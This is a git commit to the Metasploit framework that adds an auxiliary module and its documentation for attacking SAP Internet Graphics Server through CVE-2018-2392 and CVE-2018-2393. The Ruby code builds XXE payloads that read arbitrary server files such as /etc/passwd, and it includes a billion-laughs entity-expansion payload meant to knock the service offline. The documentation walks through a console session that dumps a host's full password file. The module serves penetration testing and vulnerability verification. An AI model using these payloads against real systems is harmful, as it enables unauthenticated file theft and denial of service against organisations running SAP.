7c682af98b62af6ddb2196ce588aa81b72864517
Vladimir Ivanov <ivanov.vladimir.mail@gmail.com>
2020-09-21 14:59:56 +0300

    Create sap_igs_xxe.rb and its associated documentation, and apply RuboCop fixes.

---
+++ documentation/modules/auxiliary/admin/sap/sap_igs_xxe.md
@@ -0,0 +1,171 @@
+## Vulnerable Application
+
+Original SAP Internet Graphics Server (IGS) [security research][1]
+
+This module implements the SAP IGS XXE attack.
+An unauthenticated attacker can remotely read files in the server's file system, for example: /etc/passwd
+
+The Internet Graphics Service (IGS) constitutes the infrastructure to enable the application developers to display graphics
+in an Internet browser with a minimum of effort.
+The IGS has been integrated in the different SAP UI technologies from HTML GUI to Web Dynpro ABAP/Java and
+provides a server architecture where data from an SAP system or another source can be used to generate graphical or
+non-graphical output.
+
+SAP IGS versions: 7.20, 7.20EXT, 7.45, 7.49, 7.53 are affected by this vulnerability.
+Installing and Updating the IGS [instructions][2].
+Configuring the IGS [instructions][3].
+Administering the IGS [instructions][4].
+
+Once set up and configured, the instances will be vulnerable on the default HTTP port 40080.
+
+## Verification Steps
+
+  1. Install the module as usual
+  2. Start msfconsole
+  3. Do: `workspace [WORKSPACE]`
+  4. Do: `use auxiliary/admin/sap/sap_igs_xxe`
+  5. Do: `set RHOSTS [IP]`
+  6. Do: `set FILE [remote file name]`
+  7. Do: `set SHOW [true|false]`
+  8. Do: `set action READ`
+  9. Do: `check`
+  10. Do: `run`
+
+## Options
+
+### FILE
+
+File to read from the remote server, example: `/etc/passwd`
+
+### SHOW
+
+`true` - show remote file content and save in workspace loot
+
+`false` - not show remote file content and save in workspace loot
+
+### URN
+
+XXE vulnerable SAP IGS URN: `/XMLCHART` - generates business graphics with XML-based customizing and
+XML- based data (BI 7.x Chart Item, BSP, WD)
+
+## Actions
+```
+   Name  Description
+   ----  -----------
+   READ  Remote file read
+   DOS   Denial Of Service
+```
+
+## Scenarios
+
+### Vulnerable SAP IGS release: 7.45 running on SUSE Linux Enterprise Server for SAP Applications 12 SP1
+
+```
+msf6 > workspace -a SAP_TEST
+[*] Added workspace: SAP_TEST
+[*] Workspace: SAP_TEST
+msf6 > use auxiliary/admin/sap/sap_igs_xxe
+msf6 auxiliary(admin/sap/sap_igs_xxe) > set RHOSTS 10.10.10.10
+RHOSTS => 10.10.10.10
+msf6 auxiliary(admin/sap/sap_igs_xxe) > set FILE /etc/passwd
+FILE => /etc/passwd
+msf6 auxiliary(admin/sap/sap_igs_xxe) > set action READ
+action => READ
+msf6 auxiliary(admin/sap/sap_igs_xxe) > set Proxies http:127.0.0.1:8080
+Proxies => http:127.0.0.1:8080
+msf6 auxiliary(admin/sap/sap_igs_xxe) > options
+
+Module options (auxiliary/admin/sap/sap_igs_xxe):
+
+   Name     Current Setting      Required  Description
+   ----     ---------------      --------  -----------
+   FILE     /etc/passwd          yes       File to read from the remote server
+   Proxies  http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.10.10.10          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    40080                yes       The target port (TCP)
+   SHOW     true                 no        Show remote file content
+   SSL      false                no        Negotiate SSL/TLS for outgoing connections
+   URN      /XMLCHART            no        SAP IGS XMLCHART URN
+   VHOST                         no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   READ  Remote file read
+
+
+msf6 auxiliary(admin/sap/sap_igs_xxe) > check
+[+] 10.10.10.10:40080 - The target is vulnerable. OS info: SUSE Linux Enterprise Server for SAP Applications 12 SP1
+msf6 auxiliary(admin/sap/sap_igs_xxe) > run
+[*] Running module against 10.10.10.10
+
+[+] File: /etc/passwd content from host: 10.10.10.10
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/bin/bash
+daemon:x:2:2:Daemon:/sbin:/bin/bash
+lp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bash
+mail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/false
+news:x:9:13:News system:/etc/news:/bin/bash
+uucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bash
+games:x:12:100:Games account:/var/games:/bin/bash
+man:x:13:62:Manual pages viewer:/var/cache/man:/bin/bash
+wwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/false
+ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
+nobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash
+messagebus:x:499:499:User for D-Bus:/var/run/dbus:/bin/false
+sshd:x:498:498:SSH daemon:/var/lib/sshd:/bin/false
+polkitd:x:497:496:User for polkitd:/var/lib/polkit:/sbin/nologin
+nscd:x:496:495:User for nscd:/run/nscd:/sbin/nologin
+rpc:x:495:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+openslp:x:494:2:openslp daemon:/var/lib/empty:/sbin/nologin
+uuidd:x:493:492:User for uuidd:/var/run/uuidd:/bin/bash
+usbmux:x:492:65534:usbmuxd daemon:/var/lib/usbmuxd:/sbin/nologin
+ntp:x:74:491:NTP daemon:/var/lib/ntp:/bin/false
+at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
+vnc:x:491:490:user for VNC:/var/lib/empty:/sbin/nologin
+rtkit:x:490:489:RealtimeKit:/proc:/bin/false
+pulse:x:489:488:PulseAudio daemon:/var/lib/pulseaudio:/sbin/nologin
+statd:x:488:65534:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+ftpsecure:x:487:65534:Secure FTP User:/var/lib/empty:/bin/false
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/false
+scard:x:486:485:Smart Card Reader:/var/run/pcscd:/usr/sbin/nologin
+gdm:x:485:483:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
+erpadm:x:1001:1001:SAP System Administrator:/home/erpadm:/bin/csh
+sapadm:x:1002:1001:SAP System Administrator:/home/sapadm:/bin/false
+
+[+] File: /etc/passwd saved in: /Users/vladimir/.msf4/loot/20200929135102_SAP_TEST_10.10.10.10_sap.igs.xxe_302025.txt
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/sap/sap_igs_xxe) > services
+Services
+========
+
+host         port   proto  name  state  info
+----         ----   -----  ----  -----  ----
+10.10.10.10  40080  tcp    http  open   SAP Internet Graphics Server (IGS); OS info: SUSE Linux Enterprise Server for SAP Applications 12 SP1
+
+msf6 auxiliary(admin/sap/sap_igs_xxe) > vulns
+
+Vulnerabilities
+===============
+
+Timestamp                Host         Name                                    References
+---------                ----         ----                                    ----------
+2020-09-29 10:51:01 UTC  10.10.10.10  SAP Internet Graphics Server (IGS) XXE  CVE-2018-2392,CVE-2018-2393,URL-https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
+
+msf6 auxiliary(admin/sap/sap_igs_xxe) > loot
+
+Loot
+====
+
+host         service  type         name         content     info         path
+----         -------  ----         ----         -------     ----         ----
+10.10.10.10           sap.igs.xxe  /etc/passwd  text/plain  SAP IGS XXE  /Users/vladimir/.msf4/loot/20200929135102_SAP_TEST_10.10.10.10_sap.igs.xxe_302025.txt
+
+```
+
+[1]: https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
+[2]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e193dbeb5c617e2e10000000a42189b.html
+[3]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e1939c9b5c617e2e10000000a42189b.html
+[4]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e193988b5c617e2e10000000a42189b.html
---
+++ modules/auxiliary/admin/sap/sap_igs_xxe.rb
@@ -0,0 +1,343 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+
+  prepend Msf::Exploit::Remote::AutoCheck
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(
+        update_info(
+          info,
+          'Name' => 'SAP Internet Graphics Server (IGS) XXE',
+          'Description' => %q{
+            This module implements the SAP Internet Graphics Server (IGS) XXE attack.
+            An unauthenticated attacker can remotely read files in the server's file system, for example: /etc/passwd
+            Vulnerable SAP IGS versions: 7.20, 7.20EXT, 7.45, 7.49, 7.53
+          },
+          'Author' => [
+            'Yvan Genuer', # @_1ggy The Security Researcher who originally found the vulnerability
+            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
+          ],
+          'License' => MSF_LICENSE,
+          'References' => [
+            [ 'CVE', '2018-2392' ],
+            [ 'CVE', '2018-2393' ],
+            [ 'URL', 'https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf' ]
+          ],
+          'Actions' => [
+            [ 'READ', { 'Description' => 'Remote file read' } ],
+            [ 'DOS', { 'Description' => 'Denial Of Service' } ]
+          ],
+          'DefaultAction' => 'READ',
+          'DisclosureDate' => '2018-03-14'
+        )
+    )
+    register_options(
+      [
+        Opt::RPORT(40080),
+        OptString.new('FILE', [ true, 'File to read from the remote server', '/etc/passwd']),
+        OptString.new('URN', [ false, 'SAP IGS XMLCHART URN', '/XMLCHART']),
+        OptBool.new('SHOW', [false, 'Show remote file content', true])
+      ]
+    )
+  end
+
+  def get_variables
+    @host = @datastore['RHOSTS']
+    @port = @datastore['RPORT']
+    @urn = @datastore['URN']
+    @file = @datastore['FILE']
+    @verbose = @datastore['SHOW']
+    @ssl = @datastore['SSL']
+    if @ssl
+      @schema = 'https://'
+    else
+      @schema = 'http://'
+    end
+    @data_xml = {
+      name: 'data',
+      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
+      data: nil
+    }
+    @data_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
+    <ChartData>
+      <Categories>
+        <Category>ALttP</Category>
+      </Categories>
+      <Series label="Hyrule">
+        <Point>
+          <Value type="y">#{Rex::Text.rand_text_numeric(4)}</Value>
+        </Point>
+      </Series>
+    </ChartData>)
+    @xxe_xml = {
+      name: 'custo',
+      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
+      data: nil
+    }
+  end
+
+  def make_xxe_xml(file_name)
+    get_variables
+    entity = Rex::Text.rand_text_alpha(5)
+    @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
+    <!DOCTYPE Extension [<!ENTITY #{entity} SYSTEM "#{file_name}">]>
+    <SAPChartCustomizing version="1.1">
+      <Elements>
+        <ChartElements>
+          <Title>
+            <Extension>&#{entity};</Extension>
+          </Title>
+        </ChartElements>
+      </Elements>
+    </SAPChartCustomizing>)
+  end
+
+  def make_post_data(file_name, dos = false)
+    get_variables
+
+    if !dos
+      make_xxe_xml(file_name)
+    else
+      @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
+    <!DOCTYPE Extension [
+      <!ENTITY dos 'dos'>
+      <!ENTITY dos1 '&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;'>
+      <!ENTITY dos2 '&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;'>
+      <!ENTITY dos3 '&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;'>
+      <!ENTITY dos4 '&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;'>
+      <!ENTITY dos5 '&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;'>
+      <!ENTITY dos6 '&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;'>
+      <!ENTITY dos7 '&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;'>
+      <!ENTITY dos8 '&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;'>
+    ]>
+    <SAPChartCustomizing version="1.1">
+      <Elements>
+        <ChartElements>
+          <Title>
+            <Extension>&dos8;</Extension>
+          </Title>
+        </ChartElements>
+      </Elements>
+    </SAPChartCustomizing>)
+    end
+
+    @post_data = Rex::MIME::Message.new
+    @post_data.add_part(@data_xml[:data], 'application/xml', nil, "form-data; name=\"#{@data_xml[:name]}\"; filename=\"#{@data_xml[:filename]}\"")
+    @post_data.add_part(@xxe_xml[:data], 'application/xml', nil, "form-data; name=\"#{@xxe_xml[:name]}\"; filename=\"#{@xxe_xml[:filename]}\"")
+  end
+
+  def get_download_link(html_response)
+    if html_response['ImageMap']
+      if (download_link_regex = /ImageMap" href="(?<link>.*)">ImageMap/.match(html_response))
+        @download_link = download_link_regex[:link]
+      else
+        @download_link = nil
+      end
+    else
+      @download_link = nil
+    end
+  end
+
+  def get_file_content(html_response)
+    file_content = html_response.gsub('<area shape=rect coords="0, 0,0, 0" ', '')
+    @file_content = file_content.gsub('>', '')
+  end
+
+  def analyze_first_response(html_response)
+    get_download_link(html_response)
+    if @download_link
+      begin
+        second_response = nil
+        second_response = send_request_cgi(
+          {
+            'uri' => normalize_uri(@download_link),
+            'method' => 'GET'
+          }
+        )
+      rescue StandardError => e
+        print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@download_link}")
+        if @verbose
+          vprint_error("Error #{e.class}: #{e}")
+        end
+      end
+      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if second_response.nil?
+      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless second_response.code == 200
+      get_file_content(second_response.body)
+    else
+      print_status("System is vulnerable, but not found file: #{@file} on host: #{@host}")
+    end
+  end
+
+  def check
+
+    # Set up XML data for HTTP request
+    get_variables
+    make_post_data('/etc/os-release', false) # Get linux OS release and added this in MSF Workspase
+
+    # Send HTTP request
+    begin
+      check_response = nil
+      check_response = send_request_cgi(
+        {
+          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN default: /XMLCHART)
+          'method' => 'POST',
+          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
+          'data' => @post_data.to_s
+        }
+      )
+    rescue StandardError => e
+      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
+      if @verbose
+        vprint_error("Error #{e.class}: #{e}")
+      end
+    end
+
+    # Check HTTP response
+    return Exploit::CheckCode::Safe if check_response.nil?
+    return Exploit::CheckCode::Safe unless check_response.code == 200
+    return Exploit::CheckCode::Safe unless check_response.body.include?('Picture') && check_response.body.include?('Info')
+    return Exploit::CheckCode::Safe unless check_response.body.match?(/ImageMap|Errors/)
+
+    # Get OS release information
+    os_release = ''
+    analyze_first_response(check_response.body)
+    if @file_content
+      if (os_regex = /^PRETTY_NAME.*=.*"(?<os>.*)"$/.match(@file_content))
+        os_release = "OS info: #{os_regex[:os]}"
+      end
+    end
+
+    # Report service
+    if os_release != ''
+      ident = "SAP Internet Graphics Server (IGS); #{os_release}"
+    else
+      ident = 'SAP Internet Graphics Server (IGS)'
+    end
+
+    report_service(
+      host: @host,
+      port: @port,
+      name: 'http',
+      proto: 'tcp',
+      info: ident
+    )
+
+    # Report and print Vulnerability
+    report_vuln(
+      host: @host,
+      port: @port,
+      name: name,
+      refs: references,
+      info: os_release
+    )
+
+    Exploit::CheckCode::Vulnerable(os_release)
+
+  end
+
+  def run
+    case action.name
+    when 'READ'
+      action_file_read
+    when 'DOS'
+      action_dos
+    else
+      print_error("The action #{action.name} is not a supported action.")
+    end
+  end
+
+  def action_file_read
+
+    # Set up XML data for HTTP request
+    get_variables
+    make_post_data(@file, false) # @file - is Option FILE (File to read from the remote server, by default: /etc/passwd)
+
+    # Send HTTP request
+    begin
+      first_response = nil
+      first_response = send_request_cgi(
+        {
+          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN, by default: /XMLCHART)
+          'method' => 'POST',
+          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
+          'data' => @post_data.to_s
+        }
+      )
+    rescue StandardError => e
+      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
+      if @verbose
+        vprint_error("Error #{e.class}: #{e}")
+      end
+    end
+
+    # Check first HTTP response
+    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if first_response.nil?
+    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.code == 200
+    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.body.include?('Picture') && first_response.body.include?('Info')
+    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.body.match?(/ImageMap|Errors/)
+
+    # Report Vulnerability
+    report_vuln(
+      host: @host,
+      port: @port,
+      name: name,
+      refs: references
+    )
+
+    # Download remote file
+    analyze_first_response(first_response.body)
+    if @file_content
+      if @verbose
+        print_good("File: #{@file} content from host: #{@host}\n#{@file_content}")
+      end
+      loot = store_loot('sap.igs.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XXE')
+      print_good("File: #{@file} saved in: #{loot}")
+    else
+      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}")
+    end
+
+  end
+
+  def action_dos
+
+    # Set up XML data for HTTP request
+    get_variables
+    make_post_data(@file, true)
+
+    # Send HTTP request
+    begin
+      dos_response = nil
+      dos_response = send_request_cgi(
+        {
+          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN default: /XMLCHART)
+          'method' => 'POST',
+          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
+          'data' => @post_data.to_s
+        }, 10
+      )
+    rescue Timeout::Error
+      report_vuln(
+        host: @host,
+        port: @port,
+        name: name,
+        refs: references
+      )
+      print_good("Successfully managed to DOS the SAP IGS server at #{@host}:#{@port}")
+    rescue StandardError => e
+      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
+      if @verbose
+        vprint_error("Error #{e.class}: #{e}")
+      end
+    end
+
+    # Check HTTP response
+    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless dos_response.code != 200
+
+  end
+
+end
